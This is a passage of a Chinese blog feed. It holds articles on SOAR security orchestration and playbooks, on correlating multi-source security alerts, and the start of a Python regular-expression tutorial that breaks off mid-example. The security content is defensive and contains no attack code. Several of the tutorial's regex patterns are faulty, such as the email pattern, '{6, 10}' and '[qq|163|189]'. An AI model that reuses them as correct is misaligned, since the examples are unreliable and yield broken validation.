alt="在这里插入图片描述"></p><p>这张图可以理解为从量变到质变的过程。在人类学习的过程中，学任何东西，如：学习英语，只要输入足够多通过<strong>大量的听说读写（数据量足够大）</strong>，<strong>投入的时间精力够多（训练得足够深）</strong>，一定会有拐点（涌现）发生，<strong>一定会成功</strong>，就像顿悟后开了挂一样。</p><p><strong>既然基于大模型的通用人工智能不可避免的来了，就让我们一起拥抱吧！</strong></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/ChatGPTlogo.png&quot; alt=&quot;ChatGPT&quot;&gt;&lt;/p&gt;
&lt;p&gt;最近大模型通用智能应用持续发酵，各大科技公
      
    
    </summary>
    
    
      <category term="读书" scheme="https://xiejava.gitee.io/categories/%E8%AF%BB%E4%B9%A6/"/>
    
    
      <category term="读后感" scheme="https://xiejava.gitee.io/tags/%E8%AF%BB%E5%90%8E%E6%84%9F/"/>
    
      <category term="AI机器学习" scheme="https://xiejava.gitee.io/tags/AI%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>SOAR安全事件编排自动化响应-安全运营实战</title>
    <link href="https://xiejava.gitee.io/posts/30c4e5a0/"/>
    <id>https://xiejava.gitee.io/posts/30c4e5a0/</id>
    <published>2023-10-18T07:10:59.000Z</published>
    <updated>2023-10-18T09:36:58.951Z</updated>
    
    <content type="html"><![CDATA[<p>SOAR是最近几年安全市场上最火热的词汇之一。各个安全产商都先后推出了相应的产品，但大部分都用得不是很理想。SOAR不同与传统的安全设备，买来后实施部署就完事，SOAR是一个安全运营系统，是实现安全运营过程中人、工具、流程的有效协同，提高安全运营效率的平台。核心在于运营，在运营的过程中不断结合自身企业的安全情况，对接设备、优化剧本流程、制定相应的制度来发挥SOAR安全事件编排自动化响应系统的最大的效果。在安全运营实战过程中人员、工具、流程、制度一个都不能少。本文介绍如何通过SOAR安全事件编排自动化响应进行实战化的安全运营。</p><h2 id="一、企业安全运营的通点"><a href="#一、企业安全运营的通点" class="headerlink" title="一、企业安全运营的通点"></a>一、企业安全运营的通点</h2><p> <strong>1. 手段不足，事件响应时间长</strong><br>目前安全事件的处置常常需要涉及到不同部门、不同的安全设备之间的协同联动，依靠人工电话协同、邮件协同等手段，缺少统一的安全管理和自动化编排系统，不能将繁杂安全运行过程梳理为任务和剧本，把分散的安全工具与功能转化为可编程的应用和动作。人工方式协同事件长，效率低。</p><p> <strong>2. 单兵作战，安全运营效率低</strong><br>安全设备众多，多厂商多类型安全设备，无法有效的形成合力，每类设备都要有人单独的维护、监控、处置，无法形成合力。没有统一的运营系统，无法将团队、工具和流程的高度协同起来，覆盖安全运行的防护、检测、响应等各个环节，安全运营效率低。</p><p><strong>3. 人员匮乏,运营知识无积累</strong><br>安全运营往往借助于外部的安全运营支撑力量，尤其是重保期间过度依赖厂商资源，重保结束后并没有形成知识积累；另一方面由于安全运营人员匮乏，技能水平受困于重复性劳动难以提升，而优秀的工程师的经验也难以形成标准化的流程和动作。</p><h2 id="二、企业安全运营的目标"><a href="#二、企业安全运营的目标" class="headerlink" title="二、企业安全运营的目标"></a>二、企业安全运营的目标</h2><p>针对威胁事件及安全运营痛点问题，通过建设安全编排功能实现自动化响应处置能力，完成原来需要多人多系统多界面在线协同才能处置的安全任务，简化威胁管理难度，提升响应处置效率，保障应急处置质量。从防护、检测、响应、处置等维度，形成立体防护效果，提升网络安全自动化响应处置及统一作战指挥能力。</p><p><strong>1. 实现多场景剧本编排能力</strong><br>安全编排功能实现自动化响应处置，核心能力是要实现多场景的剧本灵活编排能力，通过可视化拖拽编排方式快速创建剧本，为安全处置提供上下文，避免传统运维要在不同页面间进行跳转切换，降低安全事件处置复杂度。剧本一旦创建成功启用，后续触发剧本的事件即可通过自动化方式进行处置，降低了不同部门间协同沟通、流程流转消耗的成本。解决现有安全事件处置依靠电话、邮件进行信息传递，依靠人工进行威胁处置慢的问题。</p><p><strong>2.具备灵活的设备对接能力</strong><br>打通告警、事件与安全处置设备之间已有的壁垒，消除异构环境下异构设备无法协同、联动的问题，提供标准化的处置派单接口，实现设备的处置联动。具备低代码开发和编排能力使安全设备快速的融入到剧本流程进行灵活调度。解决异构安全设备间集成、联动处置的问题，实现多源异构安全设备的联动处置能力提升。</p><p><strong>3. 基于实际运营的知识积累</strong><br>实现在安全运营过程的统一的数字化、标准化的安全运营管理流程，在实际的运营过程中将经验固化成剧本流程，以应对繁杂和重复的工作，降低安全事件处置管理成本，降低安全人员工作强度和工作经验能力等的高要求；记录安全事件数据，以可视化的形成评估处理结果，减少人员差异带来的不可控性，并减少对新安全运维分析人员的培训成本。</p><h2 id="三、SOAR的核心能力"><a href="#三、SOAR的核心能力" class="headerlink" title="三、SOAR的核心能力"></a>三、SOAR的核心能力</h2><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231018/SOAR%E6%9E%B6%E6%9E%84.png" alt="SOAR整体架构"></p><p>安全事件处置通过安全编排与自动化响应SOAR模块实现，SOAR对接安全大数据分析引擎分析的产生的安全事件或其他如态势感知、日志系统等安全设备的安全事件，通过灵活的剧本编排实现自动的派发工单、自动化分析处置、联动设备响应，实现数据交互与业务同步，促进人、工具、流程的协同，进一步推动自动化安全运营能力落地。SOAR应该具备三大核心能力，编排、自动化、响应，参见<a href="https://blog.csdn.net/fullbug/article/details/121089374" target="_blank" rel="noopener">《认识SOAR-安全事件编排自动化响应》</a></p><h3 id="编排"><a href="#编排" class="headerlink" title="编排"></a>编排</h3><p>SOAR中的关键词是编排，这是在使用自动化和响应之前必须构建的关键组件。SOAR的编排体现的是一种协调和决策的能力，针对复杂性的安全事件，通过编排将分析过程中各种复杂性分析流程和处理平台进行组合。分析涉及多种数据或平台，如SIEM分析平台、漏洞管理平台、情报数据、资产数据等。处置响应的编排也涉及到很多平台或设备，如EDR管理平台、运维管理平台、工单管理平台、WAF设备、防火墙等。仅仅以技术为中心的安全保障已不再能满足现状，将人员和流程的编排才能保证安全流程真正高效的运行。SOAR的终极目标就是实现技术、流程、人员的无缝编排。</p><h3 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h3><p>SOAR的自动化体现在三个方面，面对需要处理的安全事件能够根据策略自动选择编排的剧本、自动执行剧本的操作流程、根据决策结果自动联动设备进行防护阻断等行动策略。它允许剧本（常称为Playbooks）在安全流程的部分或全部内容上执行多个任务，将线性剧本串联起来。虽然线性剧本可能更容易创建，但只适用于处理决策需求较少的工作流。编排和自动化比线性剧本的最大优势就是其灵活性，为支持全自动化和半自动化的决策，需要更加灵活的工作流和执行剧本。SOAR能够识别这些决策模式，并基于以往事件中的执行操作，自动推荐新事件的剧本、执行剧本操作流程，自动化分析决策，根据决策结果自动下发防护阻断的行动策略。</p><h3 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h3><p>安全事件响应包括告警管理、工单管理、案件管理等功能。告警管理的核心不仅是对告警安全事件的收集、展示和响应，更强调告警分诊和告警调查。只有通过告警分诊和告警调查才能提升告警的质量，减少告警的数量。工单管理适用于中大型的安全运维团队协同化、流程化地进行告警处置与响应，并且确保响应过程可记录、可度量、可考核。案件管理是现代安全事件响应管理的核心能力。案件管理帮助用户对一组相关的告警进行流程化、持续化的调查分析与响应处置，并不断积累该案件相关的痕迹物证 (IOC) 和攻击者的战技过程指标信息 (TTP)。多个案件并行执行，从而持续化地对一系列安全事件进行追踪处置。</p><h2 id="四、SOAR的安全运营实战"><a href="#四、SOAR的安全运营实战" class="headerlink" title="四、SOAR的安全运营实战"></a>四、SOAR的安全运营实战</h2><p>SOAR的安全运营实战，是通过编排好的安全剧本实现人员、流程、工具与知识的贯穿，实现跨区域、跨组织、跨业务、跨设备（系统）安全事件高效运营。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231018/SOAR%E6%B5%81%E7%A8%8B.png" alt="整体流程"></p><p>在HW及日常安全运营工作中，针对安全设备的统一监控处置、员工办公电脑的安全告警处置、HW重保安全事件处置等典型场景已得到充分实战化应用，通过安全事件的统一管理，从防护、检测、响应、处置等维度，提高了处置效率。可以在实际的安全运营过程中不断的丰富和优化剧本流程。有效支撑网络安全事件运营工作持续向前发展。</p><h3 id="场景1：员工电脑中毒安全事件场景"><a href="#场景1：员工电脑中毒安全事件场景" class="headerlink" title="场景1：员工电脑中毒安全事件场景"></a>场景1：员工电脑中毒安全事件场景</h3><p>员工电脑中毒安全事件主要是由员工办公终端电脑EDR检测出的病毒、木马后门等恶意软件，SOAR平台对EDR的告警数据进行统一的采集分析，形成场景化事件后通过SOAR进行告警通知，敦促员工对办公电脑进行杀毒处置。</p><ul><li>业务流程<br>该流程为自动化的流程，SOAR平台接收到员工中毒的安全事件信息后，自动发邮件或发短信通知员工，员工收到告警通知信息后对自己的办公终端电脑进行杀毒处理。如果三天内还没有处理，将继续发邮件或短信进行通知告警。</li></ul><p>具体实战剧本流程如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231018/%E5%8A%9E%E5%85%AC%E7%94%B5%E8%84%91%E4%B8%AD%E6%AF%92%E5%A4%84%E7%BD%AE%E6%B5%81%E7%A8%8B.png" alt="员工电脑中毒安全事件"></p><ul><li>人员配置</li></ul><p>人员配置如下表所示：</p><table><thead><tr><th>序号</th><th>角色名称</th><th>所需技能</th><th>承担的工作内容</th></tr></thead><tbody><tr><td>1</td><td>企业员工</td><td>能够维护自己的办公终端电脑完成自己办公终端电脑的安全。</td><td>进行杀毒软件的安装、病毒库升级、杀毒扫描。</td></tr></tbody></table><h3 id="场景2：安全设备告警安全事件场景"><a href="#场景2：安全设备告警安全事件场景" class="headerlink" title="场景2：安全设备告警安全事件场景"></a>场景2：安全设备告警安全事件场景</h3><p>安全设备告警安全事件主要是由部署在网络环境下的主机安全检测设备、WAF、IPS、蜜罐等探针检测出的各类异常安全事件行为，SOC平台进行统一的采集、分析，最终形成场景化事件，进行派单处置的闭环管理。</p><ul><li>业务流程<br>1）一线监控人员发现在SOC平台上有触发的安全事件后，根据事件携带的原始安全日志信息进行初步研判分析；<br>2）如一线人员研判该事件为误报事件，则直接处置完成，同时记录事件相关的攻击特征值，进一步完善白名单；<br>3）如一线人员研判该事件为高风险事件，则将攻击IP地址报送至网络安全运营部安全员，由安全员进行IP地址封堵操作；<br>4）当网络安全运营部处置完毕后，通知一线监控人员结束该业务流程，最终形成闭环机制；<br>5）如一线人员无法研判该事件严重程度，则上升二线安全分析人员进行深入研判，二线安全分析人员将研判最终结果反馈至一线监控人员，再由一线监控人员根据实际情况选择下一步处置动作。</li></ul><p>具体实战剧本流程如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231018/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E4%BA%8B%E4%BB%B6%E7%9B%91%E6%8E%A7%E5%89%A7%E6%9C%AC%E6%B5%81%E7%A8%8B.png" alt="安全事件监控处置"></p><ul><li>人员配置</li></ul><p>人员配置如下表所示：</p><table><thead><tr><th>序号</th><th>角色名称</th><th>所需技能</th><th>承担的工作内容</th></tr></thead><tbody><tr><td>1</td><td>安全监控员</td><td>能够初步判断安全事件影响范围及基本的应急处理措施</td><td>完成简单安全事件的处置工作，督促业务部门完成安全事件处置，做好安全事件处置的全流程管控</td></tr><tr><td>2</td><td>二线运营员</td><td>能够根据安全数据上下文判断安全事件的可信度及影响范围，能够利用各种手段开展攻击溯源及应急响应</td><td>完成复杂安全事件的研判工作，为一线监控人员提供技术指导</td></tr><tr><td>3</td><td>部门安全员</td><td>能够掌握本部门各业务系统层面、主机层面的应急流程和实际处置操作方法</td><td>配合完成IP地址封堵操作</td></tr></tbody></table><h3 id="场景3：重保HW安全事件处置场景"><a href="#场景3：重保HW安全事件处置场景" class="headerlink" title="场景3：重保HW安全事件处置场景"></a>场景3：重保HW安全事件处置场景</h3><p>重保HW安全事件主要是由包括WAF设备、VPN、蜜罐、EDR、全流量等各类安全设备检测出的对重点关注的重要靶标系统的各类攻击行为，SOAR平台对这些安全告警事件进行统一的采集、分析，最终形成场景化事件，通过SOAR进行派单调用相关的插件工具进行告警通知、资产判断、情报查询、IP封堵、协同相应的人员进行研判处置等的闭环管理。</p><ul><li>业务流程<br>1）监控人员发现安全事件后，根据事件携带的原始安全日志信息进行初步研判分析；<br>2）如研判组通过溯源研判该事件为误报事件，则直接处置完成，同时记录事件相关的攻击特征值，进一步完善白名单；<br>3）如研判组研判该事件为高风险事件，则转处置组进行处置，由处置人员进行确定通过插件自动化实现IP地址封堵操作；<br>4）处置组处置完成后进行封堵IP入库，避免被封堵IP的重复告警。</li></ul><p>具体实战剧本流程如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231018/HW%E9%87%8D%E4%BF%9D%E5%AE%89%E5%85%A8%E5%A4%84%E7%BD%AE%E5%89%A7%E6%9C%AC%E6%B5%81%E7%A8%8B.png" alt="重保HW事件处置流程"></p><ul><li>人员配置</li></ul><p>人员配置如下表所示：</p><table><thead><tr><th>序号</th><th>角色名称</th><th>所需技能</th><th>承担的工作内容</th></tr></thead><tbody><tr><td>1</td><td>安全监控员</td><td>能够初步判断安全事件影响范围及基本的应急处理措施完成简单安全事件的处置工作，督促业务部门完成安全事件处置，做好安全事件处置的全流程管控</td><td></td></tr><tr><td>2</td><td>研判组</td><td>能够根据安全数据上下文判断安全事件的可信度及影响范围，能够利用各种手段开展攻击溯源及应急响应</td><td>完成复杂安全事件的研判工作，为一线监控人员提供技术指导</td></tr><tr><td>3</td><td>处置组</td><td>对IP进行封堵响应处置。</td><td>完成IP地址封堵操作</td></tr></tbody></table><p>因为SOAR具有灵活定义剧本的能力，在实际的运营中可以根据自身企业的实际情况，为自身企业量身定制符合自身管理制度要求和人员配置情况的安全运营剧本流程，除了事件处置以外还可以编排如资产稽核管理剧本、暴露面清查剧本、漏洞管理剧本、安全设备巡检剧本等等。</p><h3 id="相关制度要求"><a href="#相关制度要求" class="headerlink" title="相关制度要求"></a>相关制度要求</h3><p>(一)  企业应建立7*24小时网络安全监测和处置机制，对所辖网络设备和系统平台开展监测，对重要系统应开展专项监测，将安全监测和事件处置统一纳入安全运营中心，事件处置统一由SOAR安全事件编排自动化响应进行处置。</p><p>(二)  应将安全工单纳入SOAR工单管控体系。安全运营支撑单位督促安全工单各环节责任人响应和处置,按流程进行超时工单升级，开展工单闭环管控。</p><p>(三)  安全运营支撑单位应优化安全监控手段，按月开展告警分析，优化安全设备和平台告警规则，持续提升安全告警准确率。</p><p>(四)  安全运营支撑单位应持续关注内外部威胁情报，实时发布威胁预警，提供处置建议和技术支撑，跟踪问题解决,安全运营维护单位应及时评估威胁影响，根据处置建议制定处置方案并实施。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;SOAR是最近几年安全市场上最火热的词汇之一。各个安全产商都先后推出了相应的产品，但大部分都用得不是很理想。SOAR不同与传统的安全设备，买来后实施部署就完事，SOAR是一个安全运营系统，是实现安全运营过程中人、工具、流程的有效协同，提高安全运营效率的平台。核心在于运营，在
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>告警繁杂迷人眼，多源分析见月明</title>
    <link href="https://xiejava.gitee.io/posts/1934f640/"/>
    <id>https://xiejava.gitee.io/posts/1934f640/</id>
    <published>2023-10-07T11:37:30.000Z</published>
    <updated>2023-10-07T11:53:30.812Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231007/1-%E5%91%8A%E8%AD%A6%E7%B9%81%E6%9D%82%E8%BF%B7%E4%BA%BA%E7%9C%BC.png" alt="告警繁杂迷人眼"></p><p>随着数字化浪潮的蓬勃兴起，网络安全问题日趋凸显，面对指数级增长的威胁和告警，传统的安全防御往往力不从心。网内业务逻辑不规范、安全设备技术不成熟都会导致安全设备触发告警。如何在海量众多安全告警中识别出真正的网络安全攻击事件成为安全运营的痛点问题。传统的分析手段，没有从威胁来源和攻击者视角来分析问题，从黑客攻击杀伤链来看，检测点和分析手段严重不足。因此需要从<strong>多源安全信息数据融合分析，实现网络攻击精准研判和处置</strong>。</p><p>从黑客攻击的视角，攻击手段多样，往往是多点突破，层层渗透。因此需要根据纵深防御的思路，在网络的出入口、在应用层、在主机层都要部署相应的安全防护检测设备。如：在企业互联网边界出口部署全流量监测设备，分析获取隐藏在流量中的恶意行为；在应用层部署WAF，分析应用层的攻击行为；在主机层面部署EDR，分析主机层面的异常行为。以攻击者的视角从网络攻击路径出发，对网络层、应用层、主机层的多源安全告警进行联动分析，精准确定安全攻击事件。</p><p>具体分析方法如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231007/2-%E5%A4%9A%E6%BA%90%E6%95%B0%E6%8D%AE%E8%9E%8D%E5%90%88%E5%88%86%E6%9E%90%E7%A0%94%E5%88%A4%E6%80%9D%E8%B7%AF.png" alt="多源数据融合分析精准研判思路"><center>多源数据融合分析精准研判思路</center></p><p><strong>1、多源数据采集</strong>。对全流量、WAF、主机安全等检测设备的告警数据进行采集，从告警数据中分析出攻击源IP、目的IP、源端口、目的端口、告警内容、告警级别、载荷信息等有效信息。并对告警数据过滤降噪，首先将源IP、目的IP、源端口、目的端口、告警内容相同的重复告警，以及告警级别为提醒的告警过滤掉。对剩下的告警进行针对性分析，针对告警级别为严重或致命的告警，根据告警内容和载荷信息筛选出潜在的针对性攻击。</p><p><strong>2、多源数据关联分析</strong>。总结人工研判经验，制定分析模型。如在不同层面的安全设备告警日志中发现相同的攻击源IP和目的IP在同一个时间段都产生了安全告警，说明既在网络侧发现了攻击行为又在应用侧和主机侧发现了攻击行为，通过不同层面告警数据的关联分析和交叉验证，可以确定该攻击是属于高可信的安全攻击事件。</p><p><strong>3、封堵处置，对攻击源进行封堵</strong>。为了避免错误的封堵影响业务，对源IP结合资产台账、黑白名单、情报数据等进行分析过滤，确定不会影响到业务后进行封堵处置。</p><p> 安全以“检测”为始，以“处置”为终。在攻击者对目标系统造成最终损害之前，制止损害或降低损失是信息安全体系的最终防线，也是及时响应的目标。以攻击者的视角从网络攻击的路径出发，对网络层、应用层、主机层的多源安全告警进行关联分析，精准确定安全攻击事件。在实战中，可通过以数据和情报驱动，采用自适应安全架构，嵌入工具、流程和策略来对抗新一代威胁。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231007/1-%E5%91%8A%E8%AD%A6%E7%B9%81%E6%9D%82%E8%BF%B7%E4%BA%BA%E7%
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Python与正则表达式</title>
    <link href="https://xiejava.gitee.io/posts/994a1838/"/>
    <id>https://xiejava.gitee.io/posts/994a1838/</id>
    <published>2023-10-06T11:44:35.000Z</published>
    <updated>2023-10-06T11:49:24.714Z</updated>
    
    <content type="html"><![CDATA[<p>我们在做机器学习项目的时候，很大部分的精力都在做数据的整理，不管是用爬虫在网上爬取数据还是对已有的数据进行整理，往往需要对一些特定的字符串进行处理，正则表达式则是进行数据处理的利器。</p><h2 id="一、什么是正则表达式"><a href="#一、什么是正则表达式" class="headerlink" title="一、什么是正则表达式"></a>一、什么是正则表达式</h2><p>正则表达式，又称规则表达式,（Regular Expression，在代码中常简写为regex、regexp或RE），是一种文本模式，包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为”元字符”），是计算机科学的一个概念。正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串，通常被用来检索、替换那些符合某个模式（规则）的文本。正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。</p><p>简单来说，正则表达式就是使用：字符串定义规则，并通过规则去验证字符串是否匹配。<br>比如，验证一个字符串是否是符合条件的电子邮箱地址，只需要配置好正则规则，即可匹配任意邮箱。</p><p>比如通过正则规则： <code>(^[\w-]+(.[\w-]+)*@[\w-]+(.[\w-]+)+$)</code>  即可匹配一个字符串是否是标准邮箱格式。但如果不使用正则，使用if else来对字符串做判断就非常困难了。</p><h2 id="二、Python中如何使用正则表达式"><a href="#二、Python中如何使用正则表达式" class="headerlink" title="二、Python中如何使用正则表达式"></a>二、Python中如何使用正则表达式</h2><p>正则表达式的使用分两部分，一是编写模式（规则）文本，也就是正则表达式；二是通过具体的编程语言来使用正则表达式进行使用，在Python语言中通过re 模块使 Python 语言拥有全部的正则表达式功能。</p><h3 id="1、正则表达式模式的编写"><a href="#1、正则表达式模式的编写" class="headerlink" title="1、正则表达式模式的编写"></a>1、正则表达式模式的编写</h3><p>模式字符串使用特殊的语法来表示一个正则表达，由一些普通字符和一些元字符（metacharacters）组成。</p><p>字母和数字表示他们自身。一个正则表达式模式中的字母和数字匹配同样的字符串。<br>多数字母和数字前加一个反斜杠时会拥有不同的含义。<br>标点符号只有被转义时才匹配自身，否则它们表示特殊的含义。<br>反斜杠本身需要使用反斜杠转义。</p><p>普通字符包括大小写的字母和数字，而元字符则具有特殊的含义，在最简单的情况下，一个正则表达式看上去就是一个普通的字符串。例如，正则表达式<code>&quot;xiejava&quot;</code>中没有包含任何元字符，它可以匹配<code>&quot;xiejava&quot;</code>和<code>&quot;xiejava1018&quot;</code>等字符串，但是不能匹配<code>&quot;XieJava&quot;</code>。</p><p>在刚刚我们只是进行了基础的字符串匹配，正则最强大的功能在于元字符匹配规则，常见的元字符匹配规则如下：</p><ul><li>单字符匹配：</li></ul><table><thead><tr><th>字符</th><th>功能</th></tr></thead><tbody><tr><td>.</td><td>匹配任意1个字符(除了\n) , .匹配点本身</td></tr><tr><td>[ ]</td><td>匹配[]中列举的字符</td></tr><tr><td>\d</td><td>匹配任意数字，等价于 [0-9]</td></tr><tr><td>\D</td><td>匹配任意非数字</td></tr><tr><td>\s</td><td>匹配任意空白字符，即空格、tab键，等价于 [\t\n\r\f]</td></tr><tr><td>\S</td><td>匹配任意非空字符</td></tr><tr><td>\w</td><td>匹配单词字符，即a-z、A-Z、0-9、</td></tr><tr><td>\W</td><td>匹配非单词字符</td></tr></tbody></table><ul><li>数量匹配：</li></ul><table><thead><tr><th>字符</th><th>功能</th></tr></thead><tbody><tr><td>*</td><td>匹配前一个规则的字符出现0至无数次</td></tr><tr><td>+</td><td>匹配前一个规则的字符出现1至无数次</td></tr><tr><td>？</td><td>匹配前一个规则的字符出现0次或1次</td></tr><tr><td>{m}</td><td>匹配前一个规则的字符出现m次</td></tr><tr><td>{m,}</td><td>匹配前一个规则的字符出现最少m次</td></tr><tr><td>{m,n}</td><td>匹配前一个规则的字符出现m到n次</td></tr></tbody></table><ul><li>边界匹配：</li></ul><table><thead><tr><th>字符</th><th>功能</th></tr></thead><tbody><tr><td>^</td><td>匹配字符串开头</td></tr><tr><td>$</td><td>匹配字符串结尾</td></tr><tr><td>\b</td><td>匹配一个单词的边界</td></tr><tr><td>\B</td><td>匹配非单词边界</td></tr></tbody></table><ul><li>分组匹配：</li></ul><table><thead><tr><th>字符</th><th>功能</th></tr></thead><tbody><tr><td>|</td><td>匹配左右任意一个表达式</td></tr><tr><td>（）</td><td>将括号中字符作为一个分组</td></tr></tbody></table><p><strong>示例：</strong><br>匹配账号，只能由字母和数字组成，长度限制6到10位<br>规则为： <code>[0-9a-zA-Z]{6, 10}$</code></p><p>匹配QQ号，要求纯数字，长度4-10，第一位不为0<br>规则为：<code>[1-9][0-9]{4, 10}</code><br>[1-9]匹配第一位，[0-9]匹配后面4到10位</p><p>匹配邮箱地址，只允许qq、163、189这三种邮箱地址<br>规则为：<code>[a-zA-Z0-9_.]+@[qq|163|189]+[.a-zA-Z]+</code></p><h3 id="2、Python中re模块的基础使用"><a href="#2、Python中re模块的基础使用" class="headerlink" title="2、Python中re模块的基础使用"></a>2、Python中re模块的基础使用</h3><p>Python中re模块常用的正则表达式包括以下四个主要方法：</p><ul><li><strong>使用match()进行准确匹配</strong><br>re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match() 就返回 none。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">account_pattern=<span class="string">'^[0-9a-zA-Z]&#123;6,9&#125;$'</span></span><br><span class="line"></span><br><span class="line">account_str1=<span class="string">'xiejava1018'</span></span><br><span class="line">account_str2=<span class="string">'xiejava'</span></span><br><span class="line">account_str3=<span class="string">'xie'</span></span><br><span class="line"></span><br><span class="line">result1=re.match(account_pattern,account_str1)</span><br><span class="line">print(result1)</span><br><span class="line">result2=re.match(account_pattern,account_str2)</span><br><span class="line">print(result2)</span><br><span class="line">result3=re.match(account_pattern,account_str3)</span><br><span class="line">print(result3)</span><br></pre></td></tr></table></figure><p>运行结果为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">None</span></span><br><span class="line">&lt;re.Match object; span=(<span class="number">0</span>, <span class="number">7</span>), match=<span class="string">'xiejava'</span>&gt;</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure><p>匹配成功 re.match 方法返回一个匹配的对象，否则返回 None。<br>我们可以使用 group(num) 或 groups() 匹配对象函数来获取匹配表达式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> result2:</span><br><span class="line">    print(result2.group())</span><br></pre></td></tr></table></figure><p>运行结果为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xiejava</span><br></pre></td></tr></table></figure><ul><li><strong>使用search()首次匹配查找</strong><br>match()方法是从字符串的开头开始匹配，一旦起始位置不匹配，match() 就返回 none，整个匹配就失败了，它更适合用来检验某个字符串是否符合某个正则表达式的规则。常用来做格式的校验。如要实现在一段文本中查找符合正则表达式的字符串，可以用re.search()，它扫描整个字符串并返回第一个成功的匹配。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">qq_pattern = <span class="string">'[1-9][0-9]&#123;4,10&#125;'</span></span><br><span class="line"></span><br><span class="line">qq_str1=<span class="string">'我的QQ号是:4002692和3641250'</span></span><br><span class="line"></span><br><span class="line">result_qq_match=re.match(qq_pattern,qq_str1)</span><br><span class="line">print(result_qq_match)</span><br><span class="line">result_qq_search=re.search(qq_pattern,qq_str1)</span><br><span class="line">print(result_qq_search)</span><br><span class="line"><span class="keyword">if</span> result_qq_search:</span><br><span class="line">    print(result_qq_search.group())</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">None</span></span><br><span class="line">&lt;re.Match object; span=(<span class="number">7</span>, <span class="number">14</span>), match=<span class="string">'4002692'</span>&gt;</span><br><span 